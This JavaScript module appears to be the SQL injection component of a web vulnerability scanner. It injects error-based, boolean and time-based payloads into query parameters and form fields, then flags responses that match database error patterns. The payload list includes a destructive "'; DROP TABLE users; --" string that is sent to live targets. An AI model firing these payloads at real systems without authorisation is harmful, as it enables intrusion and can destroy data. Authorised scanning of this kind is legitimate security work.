/**
 * services/sqliScanner.js — SQL Injection vulnerability detection
 *
 * Strategies:
 * 1. Error-based SQLi: inject payloads that trigger DB error messages
 * 2. Boolean-based SQLi: compare response length/status between true/false conditions
 * 3. Time-based (blind) SQLi: measure response delay caused by SLEEP()/WAITFOR DELAY
 */

'use strict';

const { get, post, timedGet } = require('./httpClient');
const { injectPayloadIntoQueryParams } = require('../utils/urlUtils');
const { logger } = require('../utils/logger');

// ─── Payload Sets ─────────────────────────────────────────────────────────────

/**
 * Error-triggering payloads — designed to provoke DB error messages in the response.
 */
const ERROR_PAYLOADS = [
  `'`,
  `''`,
  `' OR '1'='1`,
  `' OR 1=1 --`,
  `' OR 1=1 #`,
  `" OR 1=1 --`,
  `'; DROP TABLE users; --`,
  `1' ORDER BY 1 --`,
  `1' ORDER BY 100 --`, // Column count mismatch triggers error
  `' UNION SELECT NULL --`,
  `' AND 1=CONVERT(int, (SELECT @@version)) --`,
];

/**
 * Boolean payloads — pairs of [truthy, falsy] that should produce different responses.
 */
const BOOLEAN_PAIRS = [
  [`' OR '1'='1`, `' OR '1'='2`],
  [`' OR 1=1 --`, `' OR 1=2 --`],
  [`1 OR 1=1`, `1 OR 1=2`],
];

/**
 * Time-based blind SQLi payloads.
 * These cause a database sleep/delay — if response is slow, injection worked.
 */
const TIMING_PAYLOADS = [
  `'; WAITFOR DELAY '0:0:5' --`,           // MSSQL
  `'; SELECT SLEEP(5) --`,                  // MySQL
  `' OR SLEEP(5) --`,                       // MySQL (no query context needed)
  `' OR pg_sleep(5) --`,                    // PostgreSQL
  `'; SELECT pg_sleep(5) --`,               // PostgreSQL
  `1; WAITFOR DELAY '0:0:5' --`,
];

/** Minimum delay (ms) that we treat as a positive timing signal */
const TIMING_THRESHOLD_MS = 4500;

// ─── Error Signature Detection ────────────────────────────────────────────────

/**
 * Common SQL error patterns across MySQL, MSSQL, PostgreSQL, Oracle, SQLite.
 */
const SQL_ERROR_PATTERNS = [
  // MySQL
  /you have an error in your sql syntax/i,
  /warning: mysql_/i,
  /unclosed quotation mark/i,
  /supplied argument is not a valid mysql/i,
  // MSSQL
  /microsoft ole db provider for sql server/i,
  /odbc sql server driver/i,
  /syntax error converting the nvarchar/i,
  /incorrect syntax near/i,
  // PostgreSQL
  /pg_query\(\)/i,
  /postgresql.*error/i,
  /unterminated quoted string/i,
  // Oracle
  /ora-\d{4,5}/i,
  /oracle.*driver/i,
  // SQLite
  /sqlite_error/i,
  /sqlite3\.operationalerror/i,
  // Generic
  /sql syntax/i,
  /sql error/i,
  /db2 sql error/i,
  /jdbc.*exception/i,
  /native client.*error/i,
];

/**
 * Checks a response body for known SQL error patterns.
 * @param {string} body
 * @returns {{ found: boolean, pattern: string|null }}
 */
function detectSQLError(body) {
  if (!body) return { found: false, pattern: null };

  for (const pattern of SQL_ERROR_PATTERNS) {
    if (pattern.test(body)) {
      // Find a short snippet containing the match
      const match = body.match(pattern);
      const idx = body.toLowerCase().indexOf(match[0].toLowerCase());
      const snippet = body.slice(Math.max(0, idx - 20), idx + match[0].length + 60);
      return { found: true, pattern: match[0], evidence: `...${snippet}...` };
    }
  }

  return { found: false, pattern: null };
}

// ─── URL-level Scanning ───────────────────────────────────────────────────────

/**
 * Scans a URL for SQL injection via error-based and boolean-based detection.
 * @param {string} url
 * @returns {Promise<Array>}
 */
async function scanUrlForSQLi(url) {
  const findings = [];

  // ── 1. Error-based detection ──────────────────────────────────────────────
  for (const payload of ERROR_PAYLOADS) {
    const injectedUrls = injectPayloadIntoQueryParams(url, payload);

    for (const injectedUrl of injectedUrls) {
      try {
        const result = await get(injectedUrl);
        if (!result.ok) continue;

        const { found, pattern, evidence } = detectSQLError(result.data);
        if (found) {
          logger.warn(`SQLi (error-based) FOUND at ${url}`, { pattern });

          findings.push({
            type: 'sqli',
            severity: 'critical',
            url,
            parameter: extractChangedParam(url, injectedUrl),
            payload,
            description: `Error-based SQL Injection: DB error pattern "${pattern}" was triggered in the response`,
            evidence,
          });

          return findings; // Confirmed — no need to continue
        }
      } catch (err) {
        logger.debug(`SQLi error-scan error: ${injectedUrl}`, { error: err.message });
      }
    }
  }

  // ── 2. Boolean-based detection ────────────────────────────────────────────
  for (const [truePayload, falsePayload] of BOOLEAN_PAIRS) {
    const trueUrls = injectPayloadIntoQueryParams(url, truePayload);
    const falseUrls = injectPayloadIntoQueryParams(url, falsePayload);

    for (let i = 0; i < trueUrls.length; i++) {
      try {
        const [trueResult, falseResult] = await Promise.all([
          get(trueUrls[i]),
          get(falseUrls[i]),
        ]);

        if (!trueResult.ok || !falseResult.ok) continue;

        // Significant response length difference indicates boolean condition was evaluated
        const lenDiff = Math.abs(trueResult.data.length - falseResult.data.length);
        const pctDiff = lenDiff / (Math.max(trueResult.data.length, 1));

        // Status code change also indicates different branching
        const statusChanged = trueResult.status !== falseResult.status;

        if (pctDiff > 0.1 || statusChanged) {
          logger.warn(`SQLi (boolean-based) FOUND at ${url}`, {
            lenDiff,
            statusChanged,
          });

          findings.push({
            type: 'sqli',
            severity: 'critical',
            url,
            parameter: extractChangedParam(url, trueUrls[i]),
            payload: truePayload,
            description: `Boolean-based SQL Injection: response differs by ${lenDiff} bytes (${(pctDiff * 100).toFixed(1)}%) between true and false conditions`,
            evidence: statusChanged
              ? `Status: ${trueResult.status} (true) vs ${falseResult.status} (false)`
              : `Response length: ${trueResult.data.length} (true) vs ${falseResult.data.length} (false)`,
          });

          return findings;
        }
      } catch (err) {
        logger.debug(`SQLi boolean-scan error`, { error: err.message });
      }
    }
  }

  return findings;
}

/**
 * Scans a URL for time-based (blind) SQL injection.
 * @param {string} url
 * @returns {Promise<Array>}
 */
async function scanUrlForBlindSQLi(url) {
  const findings = [];

  for (const payload of TIMING_PAYLOADS) {
    const injectedUrls = injectPayloadIntoQueryParams(url, payload);

    for (const injectedUrl of injectedUrls) {
      try {
        const { elapsedMs, timedOut } = await timedGet(injectedUrl, 15000);

        if (timedOut || elapsedMs >= TIMING_THRESHOLD_MS) {
          logger.warn(`SQLi (time-based blind) FOUND at ${url}`, {
            elapsedMs,
            timedOut,
          });

          findings.push({
            type: 'sqli_timing',
            severity: 'critical',
            url,
            parameter: extractChangedParam(url, injectedUrl),
            payload,
            description: `Time-based Blind SQL Injection: request delayed by ${elapsedMs}ms (threshold: ${TIMING_THRESHOLD_MS}ms), indicating the DB executed a SLEEP/WAITFOR`,
            evidence: `Response time: ${elapsedMs}ms${timedOut ? ' (timed out)' : ''}`,
          });

          return findings;
        }
      } catch (err) {
        logger.debug(`SQLi timing-scan error`, { error: err.message });
      }
    }
  }

  return findings;
}

// ─── Form-level Scanning ──────────────────────────────────────────────────────

/**
 * Scans a form for SQL injection via error-based detection.
 * @param {object} form — CrawledForm
 * @returns {Promise<Array>}
 */
async function scanFormForSQLi(form) {
  const findings = [];

  for (const payload of ERROR_PAYLOADS) {
    const formData = buildFormData(form.fields, payload);

    try {
      let result;
      if (form.method === 'post') {
        result = await post(form.action, formData);
      } else {
        const url = new URL(form.action);
        for (const [k, v] of Object.entries(formData)) url.searchParams.set(k, v);
        result = await get(url.toString());
      }

      if (!result.ok) continue;

      const { found, pattern, evidence } = detectSQLError(result.data);
      if (found) {
        const injectedFields = getInjectedFields(form.fields, formData, payload);
        logger.warn(`SQLi (error-based) FOUND in form at ${form.action}`, { pattern });

        findings.push({
          type: 'sqli',
          severity: 'critical',
          url: form.action,
          parameter: injectedFields,
          payload,
          description: `Error-based SQL Injection in form: DB error pattern "${pattern}" triggered via field(s) "${injectedFields}"`,
          evidence,
        });

        return findings;
      }
    } catch (err) {
      logger.debug(`SQLi form scan error: ${form.action}`, { error: err.message });
    }
  }

  return findings;
}

// ─── Helpers ──────────────────────────────────────────────────────────────────

/**
 * Builds a form data object, injecting the payload into all text-like fields.
 */
function buildFormData(fields, payload) {
  const data = {};
  for (const field of fields) {
    const injectable = ['text', 'search', 'email', 'url', 'textarea', 'password', ''].includes(
      field.type
    );
    data[field.name] = injectable ? payload : field.value || 'test';
  }
  return data;
}

/**
 * Returns names of fields that received the payload.
 */
function getInjectedFields(fields, formData, payload) {
  return fields
    .filter((f) => formData[f.name] === payload)
    .map((f) => f.name)
    .join(', ');
}

/**
 * Identifies which query parameter was changed between original and injected URL.
 */
function extractChangedParam(originalUrl, injectedUrl) {
  try {
    const orig = new URL(originalUrl).searchParams;
    const inj = new URL(injectedUrl).searchParams;
    for (const [key, val] of inj.entries()) {
      if (orig.get(key) !== val) return key;
    }
  } catch { /* ignore */ }
  return null;
}

module.exports = { scanUrlForSQLi, scanUrlForBlindSQLi, scanFormForSQLi };